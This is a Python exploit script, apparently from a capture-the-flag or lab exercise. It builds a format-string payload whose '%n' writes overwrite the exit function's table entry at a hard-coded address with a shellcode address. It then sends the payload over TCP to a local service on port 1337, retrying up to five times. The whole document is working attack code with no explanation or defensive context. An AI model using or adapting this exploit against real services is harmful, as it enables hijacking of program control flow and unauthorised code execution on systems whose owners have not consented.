#!/usr/bin/python3
import socket
import struct
import time

def p32(hex_value):
    if not (0 <= hex_value <= 0xFFFFFFFF):
        raise ValueError("Input must be a 32-bit unsigned integer.")
    return struct.pack('<I', hex_value)

def create_payload(address_of_exit, address_of_shellcode):
    payload = b'JUNK'
    payload += p32(address_of_exit)
    payload += b'JUNK'
    payload += p32(address_of_exit + 1)
    payload += b'JUNK'
    payload += p32(address_of_exit + 2)
    payload += b'JUNK'
    payload += p32(address_of_exit + 3)

    printed_chars = len(payload)
    for shift in range(0, 32, 8):
        byte_to_insert = (address_of_shellcode >> shift) & 0xff
        res = byte_to_insert - printed_chars
        if res <= 4:
            while res <= 4:
                res += 0x100
        payload += b'%' + str(res).encode() + b'x%n'
        printed_chars += res

    return payload

HOST = '127.0.0.1'
PORT = 1337
MAX_RETRIES = 5

for attempt in range(MAX_RETRIES):
    try:
        # Create a new TCP socket for each attempt
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Set a timeout for connection attempts
        print(f"Attempt {attempt + 1}: Connecting to {HOST}:{PORT}...")
        sock.connect((HOST, PORT))
        print("Connection established.")

        address_of_exit = 0x0804b244
        address_of_shellcode = 0xffffd555

        # Generate the payload
        payload = create_payload(address_of_exit, address_of_shellcode)
        
        sock.sendall(payload)
        print(f"Data sent: {payload}")

        time.sleep(10)
        # Receive response with timeout
        sock.settimeout(3)  # Timeout for receiving data
        try:
            data = sock.recv(1024)
            print(f"Received: {data}")
        except socket.timeout:
            print("No response received within the timeout period.")

        break  # Exit the loop after successful communication
    except Exception as e:
        print(f"Error on attempt {attempt + 1}: {e}")
        if attempt == MAX_RETRIES - 1:
            print("Max retries reached. Exiting.")
        time.sleep(1)  # Wait a moment before retrying
    finally:
        sock.close()
